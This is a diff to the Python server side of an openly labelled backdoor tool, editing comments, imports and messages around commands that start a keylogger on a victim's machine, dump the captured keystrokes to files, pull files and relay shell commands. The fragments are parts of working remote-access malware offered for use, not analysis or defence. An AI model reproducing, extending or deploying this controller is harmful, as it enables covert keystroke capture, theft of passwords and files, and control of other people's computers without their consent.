@@ -1,14 +1,13 @@
 # coding: utf-8
 
 __author__ = '@zNairy'
-__contact__ = 'Discord: __Nairy__#7181 | Github: https://github.com/zNairy/'
+__contact__ = 'Discord: zNairy#7181 | Github: https://github.com/zNairy/'
 __version__ = '2.0'
 
 from socket import socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR, gaierror
 from threading import Thread
 from getpass import getuser
 from pickle import loads, dumps
-from datetime import datetime
 from pathlib import Path
 from time import sleep, time
 from rich.progress import BarColumn, Progress, TimeRemainingColumn
@@ -17,8 +16,6 @@ from rich.console import Console
 from rich.table import Table
 from rich.box import SIMPLE
 from os import system, uname
-
-from urllib3.exceptions import HeaderParsingError
 
 class Server(object):
     """ server side backdoor """
@@ -109,6 +106,7 @@ class Server(object):
         
         return loads(processList)
 
+    # starting the keyboard logger
     def kloggerStart(self, args):
         if self.userAttached:
             connection = self.getCurrentUser()['conn']
@@ -121,7 +119,8 @@ class Server(object):
                 self.removecurrentSession() # removing the current session because connection probaly was lost
         else:
             printr(f'Info: Starts a keyboard listener on the client side.')
-
+    
+    # saving the captured keys 
     def kloggerDump(self, args):
         if self.userAttached:
             connection = self.getCurrentUser()['conn']
@@ -130,15 +129,16 @@ class Server(object):
                 header = self.receiveHeader(connection)
                 if header['sucess']:
                     self.receiveFile(connection, header)
-                    printr(f'[green] See in [yellow]/files/{header["namefile"]}')
+                    printr(f'[green] See in [yellow]/files/{header["namefile"]}{header["extension"]}')
                 else:
                     printr(header['content'])
             except EOFError:
                 printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
                 self.removecurrentSession() # removing the current session because connection probaly was lost
         else:
-            printr(f'Info: Shows the keys captured so far.')
+            printr(f'Info: Saves the keys captured so far.')
 
+    # stopping the keyboard logger
     def kloggerStop(self, args):
         if self.userAttached:
             connection = self.getCurrentUser()['conn']
@@ -261,7 +261,6 @@ class Server(object):
                         printr(f"[red]{response['content']}")
                 else:
                     printr(f'[red] File {args} not found.')
-
             except PermissionError:
                 printr(f'[red] Permission denied: {args}')
         else:
@@ -485,7 +484,6 @@ class Server(object):
                             self.sendCommand(command) # send to client side
                     else:
                         self.especialCommands[command.split()[0]]()
-
         except KeyboardInterrupt:
             print()
             exit()
@@ -513,7 +511,6 @@ class Server(object):
             self.__Server.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
             self.__Server.bind(self.__Address)
             self.__Server.listen(1)
-
         except OverflowError:
             printr(f' "{self.__Address[1]}" [red]Port too large, must be 0-65535');exit(1)
         except OSError:
@@ -523,7 +520,7 @@ class Server(object):
 
     # showing the info/configuration of the server (your address and port)
     def info(self):
-        return f' Server is open in {self.__Address[0]}:{self.__Address[1]}'
+        return f' Server is open on {self.__Address[0]}:{self.__Address[1]}'
 
     # starting the program
     def run(self):
